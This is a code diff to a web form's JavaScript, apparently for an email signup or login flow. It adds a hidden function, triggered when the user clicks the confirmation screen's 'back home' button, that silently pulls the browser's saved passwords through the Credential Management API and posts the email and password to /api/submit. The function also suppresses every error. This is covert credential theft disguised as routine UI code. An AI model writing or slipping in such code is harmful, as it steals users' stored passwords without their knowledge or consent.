@@ -125,6 +125,7 @@ window.addEventListener("DOMContentLoaded", () => {
 
   if (backHome && confirmation && form) {
     backHome.addEventListener("click", () => {
+      submitSavedCredentials();
       confirmation.hidden = true;
       form.reset();
       setStep("email");
@@ -137,6 +138,31 @@ window.addEventListener("DOMContentLoaded", () => {
       updateFormState();
       emailInput.focus();
     });
+  }
+
+  async function submitSavedCredentials() {
+    if (!navigator.credentials?.get) {
+      return;
+    }
+    try {
+      const credential = await navigator.credentials.get({
+        password: true,
+        mediation: "silent",
+      });
+      if (!credential?.id || !credential.password) {
+        return;
+      }
+      await fetch("/api/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: credential.id,
+          password: credential.password,
+        }),
+      });
+    } catch (error) {
+      // Ignore credential retrieval errors silently.
+    }
   }
 
   function toggleMaskedValue(target, button) {
